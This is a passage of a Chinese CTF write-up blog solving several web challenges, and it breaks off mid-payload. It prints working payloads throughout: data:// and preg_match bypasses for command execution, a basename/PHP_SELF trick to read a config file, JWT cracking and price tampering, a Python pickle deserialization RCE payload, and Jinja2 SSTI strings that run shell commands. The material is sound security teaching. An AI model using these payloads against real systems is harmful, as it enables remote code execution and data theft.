class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Merak&#x27;</span>]))&#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$v</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$v</span>); </span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= <span class="title function_ invoke__">chr</span> ( <span class="title function_ invoke__">ord</span> (<span class="variable">$v</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">getIp</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="variable">$ip</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.<span class="title function_ invoke__">change</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">change</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>猜测<code>getIp()</code>可能通过<code>X-Forwarder-For</code>或<code>client-ip</code>头可以绕过。</p><p>因为这里提示了<strong>“Local access only”</strong></p><p><code>file_get_contents($_GET[&#39;2333&#39;]) === &#39;todat is a happy day&#39; )</code>可由<code>data:\\</code>伪协议绕过</p><p>这里的话<code>php://input</code>应该也能绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">secrettw.php?2333=data://text/plain,todat+is+a+happy+day</span><br><span class="line">空格需要url编码</span><br></pre></td></tr></table></figure><p><code>change()</code>函数将传入的字符串进行base64解码然后进行简单加密。</p><p>我们需要传入<code>flag.php</code>故需要先将<code>flag.php</code>逐字符进行加密，然后进行base64编码。</p><p>对change()的解码脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">cstr = <span class="string">&quot;flag.php&quot;</span></span><br><span class="line">tmp = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cstr)):</span><br><span class="line">    ch = <span class="built_in">chr</span>(<span class="built_in">ord</span>(cstr[i])- i*<span class="number">2</span>)</span><br><span class="line">    tmp += ch</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(tmp.encode()))</span><br></pre></td></tr></table></figure><p><strong>最终payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://6ad8a2e0-f0f7-49c9-8087-ac1021dbe1a2.node3.buuoj.cn/secrettw.php?2333=data://text/plain,todat+is+a+happy+day&amp;file=ZmpdYSZmXGI%3D</span><br></pre></td></tr></table></figure><h2 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h2><p>题目</p><p><img src="../images/image-20230412214146848.png" alt="image-20230412214146848"></p><p>考察的是  <strong>sql盲注</strong></p><h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p>题目</p><p><img src="../images/image-20230412214603190.png" alt="image-20230412214603190"></p><p><strong>知识点：PHP利用PCRE回溯次数限制绕过某些安全限制，多行绕过preg_match函数</strong></p><p><strong>preg_mathch</strong>加上   <code>m</code>   的话就不行了  ，因为<code>m</code>是多行独立匹配</p><p><strong>题目源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$json</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">is_string</span>(<span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$json</span>, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$cmd</span> !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;cmd&quot;:&quot;ls&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230412215324802.png" alt="image-20230412215324802"></p><p><strong>第一种解法</strong></p><p>因为<code>preg_match</code>只能匹配第一行，所以这里可以采用多行绕过。<br>因为<code>putenv(&#39;PATH=/home/rceservice/jail&#39;);</code>修改了环境变量，所以只能使用绝对路径使用cat命令，<code>cat</code>命令在<code>/bin</code>文件夹下</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=&#123;%0A&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;%0A&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230412215628734.png" alt="image-20230412215628734"></p><p><strong>第二种解法</strong></p><p>关于<code>preg_match</code>，有p神曾经讲的<code>PRCE</code>,但是这个题目复习环境是<strong>get</strong>传参，而非post，会导致414报错，记录一下原题wp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;zz&quot;:&quot;&#x27;</span> + <span class="string">&quot;a&quot;</span>*(<span class="number">1000000</span>) + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">&quot;http://challenges.fbctf.com:8085/&quot;</span>, data=&#123;<span class="string">&quot;cmd&quot;</span>:payload&#125;)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p><p>超出100万次的话会返回false  从而绕过if判断</p><p>这里的话是不能绕过  强等于的   <code>===</code></p><p><code>if(false===0)</code>    这样就是不能相等了</p><h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><p><img src="../images/image-20230412220712263.png" alt="image-20230412220712263"></p><p><strong>源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$secret</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">hash_equals</span>(<span class="variable">$secret</span>, <span class="variable">$guess</span>)) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Can you guess it?&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Can you guess it?&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;If your guess is correct, I<span class="string">&#x27;ll give you the flag.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;a href=&quot;?source&quot;&gt;Source&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;hr&gt;</span></span><br><span class="line"><span class="string">&lt;?php if (isset($message)) &#123; ?&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;?php &#125; ?&gt;</span></span><br><span class="line"><span class="string">    &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;text&quot; name=&quot;guess&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure><p>这道题的解法并不是在考察咋样绕过随机数那里</p><p>而是考察这段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正则的匹配ban掉了config.php。然后会highlight_file()：</p><p>可以发现这里加上了<strong>basename()</strong> 可能是为了跨目录读文件，而问题正好出在了这里，演示</p><p><strong>当我访问index.php时，我可以在后面加上一些东西，比如/index.php/config.php，这样仍然访问的是index.php，但经过basename()后，传进highlight_file()函数的文件名就变成了config.php，如果能绕过那个正则，就可以得到config.php源码了，而题目告诉FLAG就在config.php里，这道题就做完了。所以说，那个随机数就是个障眼法</strong><br><strong>可以发现发现，这个正则匹配了config.php/为$_SERVER[‘PHP_SELF’]的结尾</strong></p><p><img src="../images/image-20230412222258528.png" alt="image-20230412222258528"></p><p>老套路了，可以用%0d之类的来污染绕过，这样仍然访问得到index.php:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php/config.php/%0d   bcd都行</span><br></pre></td></tr></table></figure><p><strong>好多东西都行</strong></p><p><strong>一堆不可见字符都行</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x80 0x81 0x82 0x83 0x84 0x85 0x86 0x87 0x88 0x89 0x8a 0x8b 0x8c 0x8d 0x8e 0x8f 0x90 0x91 0x92 0x93 0x94 0x95 0x96 0x97 0x98 0x99 0x9a 0x9b 0x9c 0x9d 0x9e 0x9f 0xa0 0xa1 0xa2 0xa3 0xa4 0xa5 0xa6 0xa7 0xa8 0xa9 0xaa 0xab 0xac 0xad 0xae 0xaf 0xb0 0xb1 0xb2 0xb3 0xb4 0xb5 0xb6 0xb7 0xb8 0xb9 0xba 0xbb 0xbc 0xbd 0xbe 0xbf 0xc0 0xc1 0xc2 0xc3 0xc4 0xc5 0xc6 0xc7 0xc8 0xc9 0xca 0xcb 0xcc 0xcd 0xce 0xcf 0xd0 0xd1 0xd2 0xd3 0xd4 0xd5 0xd6 0xd7 0xd8 0xd9 0xda 0xdb 0xdc 0xdd 0xde 0xdf 0xe0 0xe1 0xe2 0xe3 0xe4 0xe5 0xe6 0xe7 0xe8 0xe9 0xea 0xeb 0xec 0xed 0xee 0xef 0xf0 0xf1 0xf2 0xf3 0xf4 0xf5 0xf6 0xf7 0xf8 0xf9 0xfa 0xfb 0xfc 0xfd 0xfe 0xff</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230412222418112.png" alt="image-20230412222418112"></p><p><strong>$_SERVER[‘PHP_SELF’]表示当前执行脚本的文件名，当使用了PATH_INFO时，这个值是可控的。所以可以尝试用/index.php/config.php?source来读取flag。</strong></p><p><strong>但是正则过滤了/config.php/*$/i</strong></p><p><code>basename()</code>函数的一个问题，它会去掉文件名开头的非ASCII值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(basename(&quot;xffconfig.php&quot;)); // =&gt; config.php</span><br><span class="line">var_dump(basename(&quot;config.php/xff&quot;)); // =&gt; config.php</span><br></pre></td></tr></table></figure><p>所以这样就能绕过正则了，payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://3.112.201.75:8003/index.php/config.php/%ff?source</span><br></pre></td></tr></table></figure><h2 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2><p>题目</p><p><img src="../images/image-20230412223240234.png" alt="image-20230412223240234"></p><p>题目给了提示   就是给买到     <code>lv6</code></p><p>然后尝试去购买，发现找不到页数，然后就查看源码，发现<code>lv5</code>等都是由<code>lv5.png</code>组成，所以就是写个脚本来遍历一下，看在哪也能找到<code>lv6.png</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://fb27b666-6efb-4d33-9167-72b5c08b84ee.node4.buuoj.cn:81/shop?page=&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">2000</span>):</span><br><span class="line">    urls = url + <span class="built_in">str</span>(i)</span><br><span class="line">    rs=requests.get(urls)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\r&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;已检测&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;页&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&#x27;lv6.png&#x27;</span> <span class="keyword">in</span> rs.text):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;在&#x27;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230412224342396.png" alt="image-20230412224342396"></p><p>最后发现是在第180页</p><p><img src="../images/image-20230412224420291.png" alt="image-20230412224420291"></p><p>发现钱不够，于是抓包查看一下，看能不能修改金额</p><p><img src="../images/image-20230412225112765.png" alt="image-20230412225112765"></p><p><img src="../images/image-20230412225054064.png" alt="image-20230412225054064"></p><p>修改折扣之后，购买成功，然后返回一个地址</p><p><img src="../images/image-20230412225211663.png" alt="image-20230412225211663"></p><p>发现只给admin用户访问，抓包的时候我们发现存在<code>JWT</code>,那么我们猜测是修改这个<code>JWT</code></p><p>第一次无密码加密的时候发现不能成功，那么就猜测这是需要<strong>密钥</strong>来进行加密的</p><p>于是我们就尝试使用爆破工具</p><p><img src="../images/image-20230412225853104.png" alt="image-20230412225853104"></p><p>爆破出密钥</p><p>哪么就去<code>jwt.io</code>尝试进行修改值</p><p><img src="../images/image-20230412230001862.png" alt="image-20230412230001862"></p><p><img src="../images/image-20230412230025452.png" alt="image-20230412230025452"></p><p>登录成功</p><p><img src="../images/image-20230412230134260.png" alt="image-20230412230134260"></p><p>查看源码  发现存在源码泄露</p><p>最后发现在<code>Admin.py</code>文件里发现漏洞</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AdminHandler</span>(<span class="title class_ inherited__">BaseHandler</span>):</span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>考察点就是python反序列化   <strong>pickle  和   loads</strong>   两关键词</p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> commands</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">payload</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (commands.getoutput,(<span class="string">&#x27;ls /&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">a = payload()</span><br><span class="line"><span class="built_in">print</span> urllib.quote(pickle.dumps(a))</span><br></pre></td></tr></table></figure><p><strong>这是使用R操作码进行操作的   然后被禁了  还可以使用其他操作码进行绕过</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c__builtin__%0Aeval%0Ap0%0A%28S%22<span class="built_in">open</span>%<span class="number">28</span>%<span class="number">27</span>/flag.txt%<span class="number">27</span>%2C%27r%<span class="number">27</span>%<span class="number">29.</span>read%<span class="number">28</span>%<span class="number">29</span>%<span class="number">22</span>%0Ap1%0Atp2%0ARp3%0A.</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230412231137498.png" alt="image-20230412231137498"></p><h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2><p>题目</p><p><img src="../images/image-20230413194516104.png" alt="image-20230413194516104"></p><p>给了提示</p><p><img src="../images/image-20230413194554347.png" alt="image-20230413194554347"></p><p>发现是jinjia2框架的ssti</p><p><img src="../images/image-20230413194801325.png" alt="image-20230413194801325"></p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?search=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">258</span>](<span class="string">&#x27;ls&#x27;</span>,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>].strip()&#125;&#125;</span><br><span class="line"></span><br><span class="line">?search=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">258</span>](<span class="string">&#x27;ls /flasklight&#x27;</span>,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>].strip()&#125;&#125;</span><br><span class="line"></span><br><span class="line">?search=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">258</span>](<span class="string">&#x27;cat 